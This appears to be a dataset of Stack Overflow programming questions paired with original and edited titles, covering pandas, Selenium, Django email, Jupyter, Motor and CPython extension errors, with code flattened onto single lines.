comparing shapes to find degree of similarity for object recognition in a fixed Region Of Interest for all images," I am relatively a newbie to computer vision and now currently doing a learning project on shape detection where I have a fixed region of interest(ROI) in all the images where the object is most likely present and I have to compare their shapes to give whether the object present in two input images are same or not.There are slight translational and scale changes and illumination changes. I am trying to compare the shape of the object between two input images and trying to provide an output value describing their similarity. If the similarity is above a certain threshold, I can tell that the same object is present in both input images. I have tried contours, but it does not give reliable results(thresholding either gives too many details or misses some vital details) and doesn't generalize well to all images. I am thinking of using global shape descriptors like HOG. But I have problems with understanding the feature vector values from the HOG descriptor. How to compare HOG feature vectors(1D) for the two input images to find similarity without using SVM or machine learning? What is the best way to compare HOG feature vectors?I don't understand how the distance measures work for comparing the future vectors. I want to understand the physical meaning of how distances are used to compare feature vectors and histograms? How to use them to compare HOG feature vectors? <code> ",comparing HOG feature vectors without SVM
"Serie.str.replace() only returning values which were replaced, I want unchanged values also"," using Pandas to remove all but last period in a string like so: my desired output, however, is: The replace command along with the mask target seem to be dropping the unreplaced values and I can't see how to remedy this. <code>  s = pd.Series(['1.234.5','123.5','2.345.6','678.9'])counts = s.str.count('\.')target = counts==2target0 True1 False2 True3 Falsedtype: bools = s[target].str.replace('\.','',1)s0 1234.52 2345.6dtype: object 0 1234.51 123.52 2345.63 678.9dtype: object",Replace all but last occurrences of a character in a string with pandas
Replacement all but the last occurrence of a string with pandas," using Pandas to remove all but last period in a string like so: my desired output, however, is: The replace command along with the mask target seem to be dropping the unreplaced values and I can't see how to remedy this. <code>  s = pd.Series(['1.234.5','123.5','2.345.6','678.9'])counts = s.str.count('\.')target = counts==2target0 True1 False2 True3 Falsedtype: bools = s[target].str.replace('\.','',1)s0 1234.52 2345.6dtype: object 0 1234.51 123.52 2345.63 678.9dtype: object",Replace all but last occurrences of a character in a string with pandas
Replacement all but the last occurrence of a character in a dataframe," using Pandas to remove all but last period in a string like so: my desired output, however, is: The replace command along with the mask target seem to be dropping the unreplaced values and I can't see how to remedy this. <code>  s = pd.Series(['1.234.5','123.5','2.345.6','678.9'])counts = s.str.count('\.')target = counts==2target0 True1 False2 True3 Falsedtype: bools = s[target].str.replace('\.','',1)s0 1234.52 2345.6dtype: object 0 1234.51 123.52 2345.63 678.9dtype: object",Replace all but last occurrences of a character in a string with pandas
Replace all but the last occurrence of a character in a dataframe," using Pandas to remove all but last period in a string like so: my desired output, however, is: The replace command along with the mask target seem to be dropping the unreplaced values and I can't see how to remedy this. <code>  s = pd.Series(['1.234.5','123.5','2.345.6','678.9'])counts = s.str.count('\.')target = counts==2target0 True1 False2 True3 Falsedtype: bools = s[target].str.replace('\.','',1)s0 1234.52 2345.6dtype: object 0 1234.51 123.52 2345.63 678.9dtype: object",Replace all but last occurrences of a character in a string with pandas
testing non-exported methods in python from a different folder," My code is organized this way: On filters.py there are some exported functions (included in __init__.py) and some unexported functions, that begin with underscore.On filters_test.py I have no trouble testing the exported functions, that I can access like this: (note that ""app"" is part of my PYTHONPATH)But then if I try to import a private function like this: This seems to work but then on runtime:SystemError: Parent module '' not loaded, cannot perform relative importAdditional notes:I'm using nose for running the testsI'd like to keep the folder structure if possible <code>  app/sampling __init__.py filters.py test filters_test.py from app.sampling import exported_function from ..filters import _private_function",testing non-exported methods in python
"How to extract False Positive, False Negative from a confusion matrix of multiclass classifiaction"," I am classifying mnist data using following Keras code. From confusion_matrix command of sklearn.metrics i got confusion matrix and from TruePositive= sum(numpy.diag(cm1)) command i am able to get True Positive. But i am confuse how to get True Negative , False Positive, False Negative. I read solution from here but user comments confuse me. please help to code to get parameters.  <code>  from sklearn.metrics import confusion_matriximport kerasfrom keras.datasets import mnistfrom keras.models import Sequentialfrom keras.layers import Dense, Dropout, Flattenfrom keras.layers import Conv2D, MaxPooling2Dfrom keras import backend as Kimport numpy as np(x_train, y_train), (x_test, y_test) = mnist.load_data()batch_size = 128num_classes = 10epochs = 1img_rows, img_cols = 28, 28y_test1=y_testif K.image_data_format() == 'channels_first': x_train = x_train.reshape(x_train.shape[0], 1, img_rows, img_cols) x_test = x_test.reshape(x_test.shape[0], 1, img_rows, img_cols) input_shape = (1, img_rows, img_cols)else: x_train = x_train.reshape(x_train.shape[0], img_rows, img_cols, 1) x_test = x_test.reshape(x_test.shape[0], img_rows, img_cols, 1) input_shape = (img_rows, img_cols, 1)x_train = x_train.astype('float32')x_test = x_test.astype('float32')x_train /= 255x_test /= 255y_train = keras.utils.to_categorical(y_train, num_classes)y_test = keras.utils.to_categorical(y_test, num_classes)model = Sequential()model.add(Conv2D(32, kernel_size=(3, 3), activation='relu', input_shape=input_shape))model.add(Conv2D(64, (3, 3), activation='relu'))model.add(MaxPooling2D(pool_size=(2, 2)))model.add(Dropout(0.25))model.add(Flatten())#model.add(GlobalAveragePooling2D())#model.add(GlobalMaxPooling2D())model.add(Dense(128, activation='relu'))model.add(Dropout(0.5))model.add(Dense(num_classes, activation='softmax'))model.compile(loss=keras.losses.binary_crossentropy, optimizer=keras.optimizers.Adadelta(), metrics=['accuracy'])model.fit(x_train, y_train, batch_size=batch_size, epochs=epochs, verbose=1, validation_data=(x_test, y_test))pre_cls=model.predict_classes(x_test)cm1 = confusion_matrix(y_test1,pre_cls)print('Confusion Matrix : \n', cm1)TruePositive= sum(np.diag(cm1))","How to extract False Positive, False Negative from a confusion matrix of multiclass classification"
how to read python source code directly from IDE," I'm currently learning Python and I want to gain a deeper understanding of how python works by reading its source code. I could manually go to the directory where Python is installed and check out the source code I was wondering, is it possible to read Python source code directly from IDE such as PyCharm? I tried to control click on a method name, even though it did bring me to the method definition page, it did not contain any implementation code Edit 1I understand a large of python (cpython to be exact) is implemented in c. Is there anyway to read the c code in IDE such as PyCharm? <code> ",How to read Python source code directly from IDE
How to get counts of the number of months a particular person has been in a service," I have a pandas dataframe which contains data as shown below: So an ID can be under any class in a particular month and next month his class might change.Now what I want to do is for each ID get the number of months it has been under a particular class and also the latest class under which it falls. Something like below: How do I achieve this in python.Can someone please help me with this?Also , since the real dataset is huge and manually verifying is not possible, how can I get a list of ID's which fall under more than 1 class? <code>  ID year_month_id Class1 201612 A2 201612 D3 201612 B4 201612 Other5 201612 Other6 201612 Other7 201612 A8 201612 Other9 201612 A1 201701 B ID Class_A Class_B Class_D Other Latest_Class1 2 3 4 0 B2 12 0 0 0 D",Get counts by group using pandas
How to transform list into dataframe? From Twitter posts," In Python 3 I made program to extract posts and likes in Twitter: This function receives the didactic classification of profiles (only for database organization) and the name of the profile. It creates a list with dictionaries, which is then returned: List of names of Twitter profiles and their didactic ratings. Then transformed into a dataframe: I create a final list to put together the lists created in the function. I do an iteration in the dataframe of the profiles to activate the function My intention later was to create a final dataframe with this, but it did not work out. My intention was to have the columns ""curtidas"", ""nome"", ""posicionamento"" and ""posts_links"" By showing the content of ""bolhas"" I believe the error was that append created several lists within the list: Is there a correct way to merge the created lists into one? I would like to keep this structure when creating a dataframe. <code>  import tweepyimport pandas as pdconsumer_key = ''consumer_secret = ''access_token = ''access_token_secret = ''auth = tweepy.OAuthHandler(consumer_key, consumer_secret)auth.set_access_token(access_token, access_token_secret)api = tweepy.API(auth) def linhadotempo(posicao, valor): tela = api.user_timeline(valor) bolha = [] for status in tela: dicionario = {""nome"": valor, ""posicionamento"": posicao, ""posts_links"": status.text, ""curtidas"": status.favorite_count} bolha.append(dicionario) return bolha data = {'nome': ['jeanwyllys_real', 'lucianagenro', 'jairbolsonaro', 'MBLivre'],'posicionamento': ['esquerda', 'esquerda', 'direita', 'direita'] }perfis = pd.DataFrame(data, columns=['nome','posicionamento'])perfis.reset_index() index nome posicionamento0 0 jeanwyllys_real esquerda1 1 lucianagenro esquerda2 2 jairbolsonaro direita3 3 MBLivre direita bolhas = []for num, row in perfis.iterrows(): bolha = linhadotempo(row['posicionamento'], row['nome']) bolhas.append(bolha) bolhas_final = pd.DataFrame(bolhas)bolhas_final.reset_index()index 0 1 2 3 4 5 6 7 8 ... 10 11 12 13 14 15 16 17 18 190 0 {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ... {'nome': 'jeanwyllys_real', 'posicionamento': ...1 1 {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... ... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es... {'nome': 'lucianagenro', 'posicionamento': 'es...2 2 {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... ... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd... {'nome': 'jairbolsonaro', 'posicionamento': 'd...3 3 {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... ... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... {'nome': 'MBLivre', 'posicionamento': 'direita... [[{'curtidas': 122, 'nome': 'jeanwyllys_real', 'posicionamento': 'esquerda', 'posts_links': 'A expresso ""ideologia de gnero"" uma farsa criada para combater a promoo da igualdade e perpetrar a violncia https:///lWdLANLzc5'}, {'curtidas': 316, 'nome': 'jeanwyllys_real', 'posicionamento': 'esquerda', 'posts_links': 'O termo fantasioso ""ideologia de gnero"" foi criado por aqueles que falam em ""ditadura gay"". Quando o ministro ileg https:///zv2aY31X9p'},... [{'curtidas': 378, 'nome': 'lucianagenro', 'posicionamento': 'esquerda', 'posts_links': 'Que coisa mais ridcula o ministro da Educao falando em rede nacional que a nova base curricular ""est sendo entr https:///h6l95GhdWT'},...{'curtidas': 500, 'nome': 'MBLivre', 'posicionamento': 'direita', 'posts_links': 'URGENTE: Lula pede 1 milho de reais em indenizao moral a Dallagnol e Justia nega https://d9vVwRH2IS via @'}]]",How to create a pandas dataframe using Tweepy?
"Selenium ""unknown error: cannot focus element"" when using Chrome"," I'm trying to play QWOP using Selenium on Chrome but I keep getting the following error: while using the following code: The same code works perfectly on Firefox, but because I want to use chrome's capability to run an webgl game in headless mode I can't really switch to Firefox.Any workarounds to get this working? <code>  selenium.common.exceptions.NoSuchElementException: Message: no such element: Unable to locate element{""method"":""id"",""selector"":""window1""(Session info: chrome=63.0.3239.108(Driver info: chromedriver=2.34.522913(36222509aa6e819815938cbf2709b4849735537c), platform=Linux 4.10.0-42-generic x86_64) from selenium import webdriverfrom selenium.webdriver.common.action_chains import ActionChainsimport timebrowser = webdriver.Chrome()browser.set_window_size(640, 480)browser.get('http://www.foddy.net/Athletics.html?webgl=true')browser.implicitly_wait(10)canvas = browser.find_element_by_id(""window1"")canvas.click()while (True): action = ActionChains(browser) action.move_to_element(canvas).perform() canvas.click() canvas.send_keys(""q"")","Selenium ""selenium.common.exceptions.NoSuchElementException"" when using Chrome"
"Selenium/JUnit: how to stop geckodriver process impacting PC memory, without calling driver.quit()?"," There is a test, smth like: So, I inited geckodriver, and successfully running my tests, using firefox instances. But I want Not to close firefox window after each run, because I just want to analyse what I have, and fix any needed, after test run(I'm going to unComment driver.quit() later).At the same time, each calling without closing the driver leads to over-impact to RAM on my PC(and does not matter - did I close browser manually, or not, after test):So, question is:is there any way to close the process(more precisely - do smth, which will close geckodriver.exe process in taskmgr) of ""geckodriver"", but will NOT close the browser after test finished? e.g., adding some method in test itself, whatever... This not impacts my work/test itself, I just want to add some optimizing. <code>  import //needed imports public class TestClass{ WebDriver driver; @Before public void setUp() { //some code } @Test public void test1() { //some code, including init of driver (geckodriver) } //@After // public void tearDown() { // driver.quit(); //}}","Selenium : How to stop geckodriver process impacting PC memory, without calling driver.quit()?"
handling contct form in django," I have an application whereby a user can contact me by filling out a form and in the form the user just has to fill in his details and his email and subject. The code throws no error but I could not receive the mail after setting up everything, but the contact details gets stored in the database as I want it to be stored.Below is my code.Models.py Forms.py Views.py gmail server terminal output <code>  class Contact(models.Model): name = models.CharField(max_length=100) message = models.TextField() sender = models.EmailField() phone = models.CharField(max_length=10) cc_myself = models.BooleanField(blank=True) time = models.DateTimeField(auto_now_add=True, db_index=True) def __str__(self): return 'Message for {}'.format(self.sender) class ContactForm(forms.ModelForm): class Meta: model = Contact fields = ['name', 'sender', 'phone', 'message', 'cc_myself'] def contact(request): if request.method == 'POST': contact_form = ContactForm(request.POST) if contact_form.is_valid(): name = contact_form.cleaned_data['name'] message = contact_form.cleaned_data['message'] sender = contact_form.cleaned_data['sender'] phone = contact_form.cleaned_data['phone'] cc_myself = contact_form.cleaned_data['cc_myself'] recipients = ['xxxx@gmail.com'] if cc_myself: recipients.append(sender) send_mail(name, message, sender, recipients) contact_form.save() messages.success(request, 'Message sent successfully') return redirect('contact:contact') else: messages.error(request, 'Error sending your Message') else: contact_form = ContactForm(request.POST) context = { ""contact_form"": contact_form, } template = 'contact.html' return render(request, template, context) EMAIL_HOST = 'smtp.gmail.com'EMAIL_HOST_USER = 'xxx@gmail.com'EMAIL_HOST_PASSWORD = 'xxxx'EMAIL_PORT = '587'EMAIL_USE_TLS = True MIME-Version: 1.0Content-Type: text/plain; charset=""utf-8""Content-Transfer-Encoding: 7bitSubject: adie UgbeFrom: abcd@gmail.comTo: xxxx@gmail.comDate: Sun, 07 Jan 2018 11:11:10 -0000Message-ID: <20180107111110.29855.10393@1.0.0.127.in-addr.arpa>oh oh no ooo dddddddd se skan-------------------------------------------------------------------------------Successful","Handling contact form in Django, email not sent"
"handling contact form in django, Email no Sent"," I have an application whereby a user can contact me by filling out a form and in the form the user just has to fill in his details and his email and subject. The code throws no error but I could not receive the mail after setting up everything, but the contact details gets stored in the database as I want it to be stored.Below is my code.Models.py Forms.py Views.py gmail server terminal output <code>  class Contact(models.Model): name = models.CharField(max_length=100) message = models.TextField() sender = models.EmailField() phone = models.CharField(max_length=10) cc_myself = models.BooleanField(blank=True) time = models.DateTimeField(auto_now_add=True, db_index=True) def __str__(self): return 'Message for {}'.format(self.sender) class ContactForm(forms.ModelForm): class Meta: model = Contact fields = ['name', 'sender', 'phone', 'message', 'cc_myself'] def contact(request): if request.method == 'POST': contact_form = ContactForm(request.POST) if contact_form.is_valid(): name = contact_form.cleaned_data['name'] message = contact_form.cleaned_data['message'] sender = contact_form.cleaned_data['sender'] phone = contact_form.cleaned_data['phone'] cc_myself = contact_form.cleaned_data['cc_myself'] recipients = ['xxxx@gmail.com'] if cc_myself: recipients.append(sender) send_mail(name, message, sender, recipients) contact_form.save() messages.success(request, 'Message sent successfully') return redirect('contact:contact') else: messages.error(request, 'Error sending your Message') else: contact_form = ContactForm(request.POST) context = { ""contact_form"": contact_form, } template = 'contact.html' return render(request, template, context) EMAIL_HOST = 'smtp.gmail.com'EMAIL_HOST_USER = 'xxx@gmail.com'EMAIL_HOST_PASSWORD = 'xxxx'EMAIL_PORT = '587'EMAIL_USE_TLS = True MIME-Version: 1.0Content-Type: text/plain; charset=""utf-8""Content-Transfer-Encoding: 7bitSubject: adie UgbeFrom: abcd@gmail.comTo: xxxx@gmail.comDate: Sun, 07 Jan 2018 11:11:10 -0000Message-ID: <20180107111110.29855.10393@1.0.0.127.in-addr.arpa>oh oh no ooo dddddddd se skan-------------------------------------------------------------------------------Successful","Handling contact form in Django, email not sent"
Jupyter notebook on mac: TypeError: __init__() got an unexpected keyword argument 'io_loop'," I recently installed jupyter notebooks on my macbook pro.When I create a new notebook, I see the following exception coming continuously on the terminal where I started the notebook. Python version is 2.7.Any pointers to how I can resolve this? <code>  Monideeps-MacBook-Pro:PythonNotebooks monideepde$ jupyter-notebook [I 12:18:43.675 NotebookApp] Serving notebooks from local directory: /Users/monideepde/Documents/PythonNotebooks[I 12:18:43.675 NotebookApp] 0 active kernels[I 12:18:43.676 NotebookApp] The Jupyter Notebook is running at:[I 12:18:43.676 NotebookApp] http://localhost:8888/?token=dcb1990694d91ded77f4287a588886ea567b5907ac8aeafa[I 12:18:43.676 NotebookApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).[C 12:18:43.677 NotebookApp] Copy/paste this URL into your browser when you connect for the first time, to login with a token: http://localhost:8888/?token=dcb1990694d91ded77f4287a588886ea567b5907ac8aeafa[I 12:18:43.896 NotebookApp] Accepting one-time-token-authenticated connection from ::1[W 12:18:44.778 NotebookApp] 404 GET /static/components/moment/locale/en-gb.js?v=20180104121843 (::1) 21.10ms referer=http://localhost:8888/tree[I 12:18:54.840 NotebookApp] Creating new notebook in [W 12:18:55.716 NotebookApp] 404 GET /static/components/moment/locale/en-gb.js?v=20180104121843 (::1) 3.06ms referer=http://localhost:8888/notebooks/Untitled.ipynb?kernel_name=python2[I 12:18:55.920 NotebookApp] Kernel started: 5e16fa4b-3e35-4265-89b0-ab36bb0573f5[W 12:18:55.941 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20180104121843 (::1) 5.57ms referer=http://localhost:8888/notebooks/Untitled.ipynb?kernel_name=python2[I 12:18:56.998 NotebookApp] Adapting to protocol v5.1 for kernel 5e16fa4b-3e35-4265-89b0-ab36bb0573f5[E 12:18:57.001 NotebookApp] Uncaught exception in /api/kernels/5e16fa4b-3e35-4265-89b0-ab36bb0573f5/channels Traceback (most recent call last): File ""/Library/Python/2.7/site-packages/tornado-5.0a1-py2.7-macosx-10.13-intel.egg/tornado/websocket.py"", line 494, in _run_callback result = callback(*args, **kwargs) File ""/Library/Python/2.7/site-packages/notebook-5.2.2-py2.7.egg/notebook/services/kernels/handlers.py"", line 258, in open super(ZMQChannelsHandler, self).open() File ""/Library/Python/2.7/site-packages/notebook-5.2.2-py2.7.egg/notebook/base/zmqhandlers.py"", line 168, in open self.send_ping, self.ping_interval, io_loop=loop, TypeError: __init__() got an unexpected keyword argument 'io_loop'[I 12:18:58.021 NotebookApp] Adapting to protocol v5.1 for kernel 5e16fa4b-3e35-4265-89b0-ab36bb0573f5",Jupyter notebook: TypeError: __init__() got an unexpected keyword argument 'io_loop'
How to cleanly shutdown Change Streams on Python?," TL; DRThis was indeed a bug in Motor 1.2.0 that was promptly fixed by A. Jesse Jiryu Davis and is available in version 1.2.1 or greater of the driver.Original QuestionI wrote a program to monitor changes to a MongoDB collection using its new Change Stream feature, on Python 3. Here's the MCVE: When I kill the program with CTRL+C, it raises three different exceptions. Is there a way to make that program close silently?I'm testing with Python 3.6.4, Motor 1.2 and pymongo 3.6.0 on macOS Sierra. <code>  from asyncio import get_event_loop, CancelledErrorfrom contextlib import suppressfrom motor.motor_asyncio import AsyncIOMotorClientasync def watch(collection): async with collection.watch([]) as stream: async for change in stream: print(change)async def cleanup(): task.cancel() with suppress(CancelledError): await taskif __name__ == '__main__': conn = AsyncIOMotorClient() loop = get_event_loop() task = loop.create_task(watch(conn.database.collection)) # Replace with a real collection. try: loop.run_forever() except KeyboardInterrupt: pass finally: loop.run_until_complete(cleanup()) loop.shutdown_asyncgens() loop.close() ^Cexception calling callback for <Future at 0x102efea58 state=finished raised InvalidStateError>Traceback (most recent call last): File ""/Users/viotti/motor/lib/python3.6/site-packages/motor/core.py"", line 1259, in _next change = self.delegate.next() File ""/Users/viotti/motor/lib/python3.6/site-packages/pymongo/change_stream.py"", line 79, in next change = self._cursor.next() File ""/Users/viotti/motor/lib/python3.6/site-packages/pymongo/command_cursor.py"", line 292, in next raise StopIterationStopIterationDuring handling of the above exception, another exception occurred:Traceback (most recent call last): File ""/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/concurrent/futures/thread.py"", line 56, in run result = self.fn(*self.args, **self.kwargs) File ""/Users/viotti/motor/lib/python3.6/site-packages/motor/core.py"", line 1264, in _next future.set_exception(StopAsyncIteration())asyncio.base_futures.InvalidStateError: invalid stateDuring handling of the above exception, another exception occurred:Traceback (most recent call last): File ""/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/concurrent/futures/_base.py"", line 324, in _invoke_callbacks callback(self) File ""/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/asyncio/futures.py"", line 414, in _call_set_state dest_loop.call_soon_threadsafe(_set_state, destination, source) File ""/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/asyncio/base_events.py"", line 620, in call_soon_threadsafe self._check_closed() File ""/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/asyncio/base_events.py"", line 357, in _check_closed raise RuntimeError('Event loop is closed')RuntimeError: Event loop is closed",How to cleanly shutdown Change Streams with Motor?
Fatal Python error: PyThreadState_Get: no current thread," I've seen several posts that have stated the same error, but looking and trying out the answers in those posts have not helped. I was wondering if someone could look at this and see if something pops out?I'm building a Python extension for a CPP application, and there are no errors during the compilation and build step. However, when I import the module I get the error mentioned in the title. Other stackoverflow answers have claimed that this is because of being linked with one library while compilation and using a different interpreter. As far as I can tell, I'm using the same Python interpreter. I'm going to describe now why I think I'm using the same Python in the linking process and for the interpreter.This is the comand I'm using to build the Python extension If I try to import the python file that imports the shared library, it throws the fatal error. If I use otool -L on the shared library, I get the following. This is what I expect to get. I also tried install_name_tool to add the full path of the libpython3.6m.dylib. I still get the same fatal error. My hypothesis is that my Mac System Python 2.7 installation is having an effect on this process at some stage. I'm unable to identify where though.Is there a way to add more debug statements to find out why there is a Fatal Python error. Currently, the error message is very short. Curiously, if I use a conda environment and use Python 2.7, I'm able to load the extension fine! This is why I think that when I'm using Python 3.6, it is somehow picking up something from the default mac system python 2.7 installation and working fine. It is picking the same thing up when I use the conda 2.7 python environment, but because they are both Python 2.7 (though conda is 2.7.14 and system python is 2.7.10) it seems to work. This is the otool -L output when I use a conda environment. The questions I have are 1) how do I get more debug information out of the error from Python. I have tried python -vvv and that does not give me enough information. I tried using gdb but that also did not give me any information. I believe it requires recompiling Python itself using debug symbols. 2) Do you have any recommendations on how to solve this problem or debug further? Also, I'm not sure if this is useful information, but I am able to use ctypes and load the shared library after I create it. I'm just unable to import it as a python module.This is the original issue if one is interested - https://github.com/GMLC-TDC/HELICS-src/issues/59Edit: I tried this using zsh and bash, and still got the same error. I also tried setting the following export PATH=""/Users/$USER/miniconda3/bin:/Users/$USER/miniconda3/lib"" temporarily in the shell and running and I STILL get the same error. This should have excluded my Mac System Python 2.7.10, so I'm really not sure what is going on.Edit again: I've also tried reinstalling miniconda with Python2. And if I use Python2 everything works fine. I'm just unable to use Python3 using miniconda. Oddly enough, if I use homebrew and install Python3 that seems to work fine.Edit again: This is possibly an issue with High Sierra. I currently don't have access to another mac, but I'm on the latest operating system which has SIP. I'm not sure if this is causing this issue. Additionally, I've tried using Anaconda3 and had no luck.Edit again: This does not seem to be related to the operating system. I'm able to run this successfully on another computer with High Sierra. Edit again: I tested this on other fresh OS installs, and they don't work. But they do work on two of my machines. Are there other tools that tell you what dependency a library requires or where Python throws a fatal error? My best guess at the moment is that I've installed something on my other machines in the past that allows this to work. I need to identify what that was and make sure I can document it.Edit again: I've added a gist of the output of the version of Python that I'm using. Edit again: I've added the tags for miniconda and anaconda since I don't experience this issue when using homebrew python3, but only just when I'm using miniconda3 or anaconda2 with a python3 environment. This always appears to work with Python2, regardless of whether it is homebrew, anaconda or miniconda.Edit again:These are the steps if someone else wants to replicate on their machine. <code>  $ gcc -shared helicsPYTHON_wrap.c $(python-config3 --includes) -I/path/to/helics-0.9/includes -L/path/to/helics-0.9/lib -lhelicsSharedLib -L$(python3-config --prefix)/lib -lpython3.6m -o _helics.so$ which python3-config/Users/$USER/miniconda3/bin/python3-config$ python3-config --prefix/Users/$USER/miniconda3 $ otool -L _helics.so_helics.so: @rpath/libhelicsSharedLib.dylib (compatibility version 0.0.0, current version 0.0.0) @rpath/libpython3.6m.dylib (compatibility version 3.6.0, current version 3.6.0) /usr/local/opt/zeromq/lib/libzmq.5.dylib (compatibility version 7.0.0, current version 7.3.0) libboost_program_options.dylib (compatibility version 0.0.0, current version 0.0.0) libboost_filesystem.dylib (compatibility version 0.0.0, current version 0.0.0) libboost_system.dylib (compatibility version 0.0.0, current version 0.0.0) libboost_date_time.dylib (compatibility version 0.0.0, current version 0.0.0) /usr/local/opt/gcc/lib/gcc/7/libstdc++.6.dylib (compatibility version 7.0.0, current version 7.24.0) /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1238.60.2) /usr/local/lib/gcc/7/libgcc_s.1.dylib (compatibility version 1.0.0, current version 1.0.0) $ install_name_tool -change @rpath/libpython3.6m.dylib /Users/$USER/miniconda3/envs/py3/lib/libpython3.6m.dylib _helics.so $ python helics.pyFatal Python error: PyThreadState_Get: no current thread[1] 64481 abort python helics.py $ otool -L _helics.so_helics.so: @rpath/libhelicsSharedLib.dylib (compatibility version 0.0.0, current version 0.0.0) @rpath/libpython2.7.dylib (compatibility version 2.7.0, current version 2.7.0) /usr/local/opt/zeromq/lib/libzmq.5.dylib (compatibility version 7.0.0, current version 7.3.0) libboost_program_options.dylib (compatibility version 0.0.0, current version 0.0.0) libboost_filesystem.dylib (compatibility version 0.0.0, current version 0.0.0) libboost_system.dylib (compatibility version 0.0.0, current version 0.0.0) libboost_date_time.dylib (compatibility version 0.0.0, current version 0.0.0) /usr/local/opt/gcc/lib/gcc/7/libstdc++.6.dylib (compatibility version 7.0.0, current version 7.24.0) /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1238.60.2) /usr/local/lib/gcc/7/libgcc_s.1.dylib (compatibility version 1.0.0, current version 1.0.0) git clone https://github.com/GMLC-TDC/HELICS-srcmkdir build-osxbrew install boostbrew install cmakebrew install swigcmake -DBUILD_PYTHON=ON -DPYTHON_LIBRARY=$(python3-config --prefix)/lib/libpython3.6m.dylib -DPYTHON_INCLUDE_DIR=$(python3-config --prefix)/include/python3.6m/ ..makecd ./swig/python/python helics.py # Error",Fatal error in extension: PyThreadState_Get: no current thread
Web Scraping: Python requests returns 404 page for specific URL," I am trying to web scrape the content of few of the websites. But I noticed that for some of the websites I am getting the response with status code as 200. However, for some other of them I am getting 404 status code with the response. But when I am opening these websites (returning 404) in the browser, it is loading fine for me. What am I missing here?For example: <code>  import requestsurl_1 = ""https://www.transfermarkt.com/jumplist/startseite/wettbewerb/GB1""url_2 = ""https://stackoverflow.com/questions/36516183/what-should-i-use-instead-of-urlopen-in-urllib3""page_t = requests.get(url_2)print(page_t.status_code) #Getting a Not Found page and 404 statuspage = requests.get(url_1)print(page.status_code) #Getting a Valid HTML page and 200 status","404 status code while making HTTP request via Python's ""requests"" library. However page is loading fine in browser"
